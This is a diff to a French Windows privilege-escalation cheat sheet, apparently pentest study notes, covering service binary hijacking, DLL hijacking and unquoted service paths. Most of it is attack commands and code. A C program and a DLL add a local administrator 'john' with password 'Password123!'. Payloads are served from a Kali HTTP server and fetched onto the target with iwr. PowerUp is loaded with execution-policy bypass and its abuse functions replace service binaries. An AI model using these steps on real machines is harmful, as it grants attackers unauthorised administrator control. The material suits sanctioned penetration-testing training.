@@ -89,6 +89,19 @@ Get-Process | Where-Object {$_.Path -notlike "C:\Windows\*" -and $_.Path -ne $nu
 Get-Process NonStandardProcess | Select-Object Path
 ```
 
+**Services**
+
+```powershell
+Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName
+
+# Ancienne méthode
+Get-WmiObject Win32_Service | Select-Object Name, State, StartMode, PathName
+```
+
+```cmd
+wmic service get name,state,startmode,pathname
+```
+
 **Recherche de fichiers sensibles par extension**
 ```powershell
 # Password manager databases
@@ -252,10 +265,12 @@ msbuild Seatbelt.sln /p:Configuration=Release
 
 ### Service Binary Hijacking
 
+#### Manuel
+
 **Lister les services en cours avec leur binaire**
 
 ```powershell
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
 **Vérifier les permissions sur un binaire de service**
@@ -272,13 +287,13 @@ icacls "C:\xampp\mysql\bin\mysqld.exe"
 #include <stdlib.h>
 int main() {
   system("net user john Password123! /add");
-  system("net localgroup administrators johndoe /add");
+  system("net localgroup administrators john /add");
   return 0;
 }
 ```
 
 ```bash
-# Compiler sur Kali
+# Kali : compiler et servir
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 python3 -m http.server 80
 ```
@@ -295,12 +310,13 @@ net stop mysql
 net start mysql
 ```
 
-**Vérifier le Startup Type et les privilèges de reboot**
+**Si pas les droits de redémarrer - vérifier le Startup Type et rebooter**
 
 Si le service est `Auto`, un reboot suffit. Vérifier `SeShutdownPrivilege`.
 
 ```powershell
-Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
+Get-CimInstance -ClassName win32_service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.Name -like 'mysqld'}
+
 whoami /priv
 shutdown /r /t 0
 ```
@@ -308,12 +324,15 @@ shutdown /r /t 0
 **Vérifier que l'exploitation a fonctionné**
 
 ```cmd
+net user
 net localgroup administrators
 ```
 
-**PowerUp - détecter les binaires de service modifiables**
+#### PowerUp
+Crée un user `john` / `Password123!` ajouté aux admins locaux par défaut.
 
 ```bash
+# Kali
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
 ```
@@ -323,32 +342,27 @@ iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-ModifiableServiceFile
+# Puis utiliser l'AbuseFunction indiquée dans l'output
+Install-ServiceBinary -Name '<service>'
 ```
 
 Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.
 
 ### DLL Hijacking
 
+#### Manuel
+
 **Installer Process Monitor (nécessite admin)**
 
 ```cmd
-winget install Microsoft.Sysinternals
+winget install Microsoft.Sysinternals.ProcessMonitor
 ```
 
-Ou télécharger depuis : https://learn.microsoft.com/fr-fr/sysinternals/downloads/sysinternals-suite
+Ou télécharger depuis : https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
 
-**Détecter les DLLs hijackables sans admin avec PowerUp**
+**Identifier les DLLs manquantes avec Procmon**
 
-Ne détecte que les DLLs déjà chargées, pas les `NAME NOT FOUND`. Les erreurs de process introuvables sont normales.
-
-```powershell
-. .\PowerUp.ps1
-Find-ProcessDLLHijack -ErrorAction SilentlyContinue
-```
-
-**Identifier les DLLs manquantes avec Process Monitor**
-
-Nécessite admin. Lancer Procmon, filtrer sur `Process Name is <process>`, puis `Operation is CreateFile` + `Result is NAME NOT FOUND`. Les entrées indiquent une DLL manquante — vérifier si le répertoire concerné est accessible en écriture. Si pas admin sur la cible, reproduire en local sur sa propre machine.
+Nécessite admin. Lancer Procmon, filtrer sur `Process Name is <process>`, puis `Operation is CreateFile` + `Result is NAME NOT FOUND`. Si pas admin sur la cible, reproduire en local sur sa propre machine.
 
 **Vérifier qu'on peut écrire dans le répertoire de l'application**
 
@@ -379,14 +393,12 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 ```
 
 ```bash
-# Compiler sur Kali
+# Kali : compiler et servir
 x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 python3 -m http.server 80
 ```
 
-**Placer la DLL dans le répertoire de l'application et attendre l'exécution**
-
-La DLL sera chargée avec les privileges de l'utilisateur qui lance l'application — attendre qu'un admin le fasse.
+**Placer la DLL et attendre l'exécution par un admin**
 
 ```powershell
 iwr -uri http://<ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
@@ -395,5 +407,89 @@ iwr -uri http://<ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client
 **Vérifier que l'exploitation a fonctionné**
 
 ```cmd
+net user
+net localgroup administrators
+```
+
+#### PowerUp
+
+Ne détecte que les DLLs déjà chargées, pas les `NAME NOT FOUND`. Les erreurs de process introuvables sont normales.
+
+```bash
+# Kali
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+```
+
+```powershell
+iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Find-ProcessDLLHijack -ErrorAction SilentlyContinue
+```
+
+### Unquoted Service Paths
+
+Si un chemin de service contient des espaces sans guillemets, Windows interprète chaque espace comme une fin de nom de fichier possible. Ex : `C:\Program Files\My App\service.exe` → Windows essaie `C:\Program.exe`, puis `C:\Program Files\My.exe`, etc. Si on peut écrire dans un de ces répertoires, on y place un binaire malveillant avec le nom attendu.
+
+#### Manuel
+
+**Lister les services avec des espaces et sans guillemets**
+
+```powershell
+Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch 'C:\\Windows'}
+```
+
+```cmd
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+**Vérifier les permissions d'écriture sur les répertoires du chemin**
+
+```cmd
+icacls "C:\Program Files\Enterprise Apps"
+```
+
+**Placer le binaire malveillant et démarrer le service**
+
+Le service peut retourner une erreur mais le binaire est quand même exécuté.
+
+```powershell
+iwr -uri http://<ip>/adduser.exe -Outfile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+net start GammaService
+```
+
+**Vérifier que l'exploitation a fonctionné**
+
+```cmd
+net user
+net localgroup administrators
+```
+
+#### PowerUp
+
+Crée un user `john` / `Password123!` ajouté aux admins locaux par défaut.
+
+```bash
+# Kali
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+```
+
+```powershell
+iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+net stop GammaService
+net start GammaService
+```
+
+**Vérifier que l'exploitation a fonctionné**
+
+```cmd
+net user
 net localgroup administrators
 ```
